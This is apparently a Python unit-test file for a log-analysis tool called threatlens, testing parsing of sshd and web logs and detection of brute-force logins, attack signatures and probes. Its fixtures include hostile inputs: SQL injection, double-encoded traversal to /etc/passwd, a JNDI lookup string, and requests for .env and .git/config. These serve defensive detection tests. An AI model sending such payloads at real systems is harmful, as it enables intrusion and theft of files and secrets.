import datetime as dt
import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import threatlens as tl  # noqa: E402

CFG = tl.Config()


def fail(sec, ip="203.0.113.5", user="root"):
    return tl.parse_auth_line(
        f"Sep 24 10:00:{sec:02d} host sshd[1]: Failed password for {user} from {ip} port 22 ssh2", 2026)


def web(path, status=200, ip="203.0.113.9", agent="Mozilla/5.0", ts="24/Sep/2026:10:00:00 +0000"):
    return tl.parse_web_line(
        f'{ip} - - [{ts}] "GET {path} HTTP/1.1" {status} 10 "-" "{agent}"')


class ParsingTests(unittest.TestCase):
    def test_auth_failed_and_accepted(self):
        f = fail(1, user="admin")
        self.assertEqual((f.ip, f.user, f.ok), ("203.0.113.5", "admin", False))
        ok = tl.parse_auth_line("Sep 24 10:00:05 h sshd[2]: Accepted publickey for bob from 10.0.0.1 port 22 ssh2", 2026)
        self.assertTrue(ok.ok)

    def test_auth_ignores_other_lines(self):
        self.assertIsNone(tl.parse_auth_line("Sep 24 10:00:05 h sshd[2]: Invalid user x from 1.2.3.4", 2026))
        self.assertIsNone(tl.parse_auth_line("Sep 24 10:00:05 h cron[9]: job started", 2026))

    def test_web_timezone_normalised_to_utc(self):
        e = web("/", ts="24/Sep/2026:12:00:00 +0200")
        self.assertEqual(e.ts, dt.datetime(2026, 9, 24, 10, 0, 0))

    def test_web_path_with_raw_space(self):
        e = web("/p?id=1' OR '1'='1")
        self.assertEqual(e.path, "/p?id=1' OR '1'='1")

    def test_web_garbage_is_skipped(self):
        self.assertIsNone(tl.parse_web_line("\\x16\\x03\\x01 not a log line"))


class DetectionTests(unittest.TestCase):
    def test_below_threshold_is_quiet(self):
        events = [fail(s) for s in range(4)]
        self.assertEqual(list(tl.detect_ssh_bruteforce(events, CFG)), [])

    def test_bruteforce_then_success_is_critical(self):
        events = [fail(s) for s in range(6)]
        events.append(tl.parse_auth_line(
            "Sep 24 10:00:30 h sshd[3]: Accepted password for root from 203.0.113.5 port 22 ssh2", 2026))
        (f,) = tl.detect_ssh_bruteforce(events, CFG)
        self.assertEqual(f.severity, "critical")

    def test_slow_attempts_outside_window_are_ignored(self):
        events = [fail(0), fail(20), fail(40)]
        narrow = tl.Config(ssh_threshold=3, ssh_window=10)
        wide = tl.Config(ssh_threshold=3, ssh_window=60)
        self.assertEqual(list(tl.detect_ssh_bruteforce(events, narrow)), [])
        self.assertEqual(len(list(tl.detect_ssh_bruteforce(events, wide))), 1)

    def test_double_encoded_traversal(self):
        found = list(tl.detect_signatures([web("/f?x=%252e%252e%252fetc%252fpasswd")], CFG))
        self.assertEqual([f.rule for f in found], ["sig-path-traversal"])

    def test_jndi_in_user_agent(self):
        found = list(tl.detect_signatures([web("/", agent="${jndi:ldap://x/a}")], CFG))
        self.assertEqual(found[0].severity, "critical")

    def test_benign_traffic_has_no_findings(self):
        events = [web(p) for p in ("/", "/about", "/static/app.css", "/products?id=12")]
        self.assertEqual(tl.analyze([], events, CFG), [])

    def test_probe_served_is_high(self):
        events = [web("/.env"), web("/.git/config"), web("/wp-login.php", status=404)]
        (f,) = tl.detect_probing(events, CFG)
        self.assertEqual(f.severity, "high")


class HelperTests(unittest.TestCase):
    def test_allowlist(self):
        nets = tl.make_allowlist("10.0.0.0/8, 192.168.1.5")
        self.assertTrue(tl.is_allowed("10.2.3.4", nets))
        self.assertTrue(tl.is_allowed("192.168.1.5", nets))
        self.assertFalse(tl.is_allowed("203.0.113.5", nets))
        self.assertFalse(tl.is_allowed("not-an-ip", nets))

    def test_clean_strips_terminal_escapes(self):
        self.assertNotIn("\x1b", tl.clean("evil \x1b[31mred"))


if __name__ == "__main__":
    unittest.main()
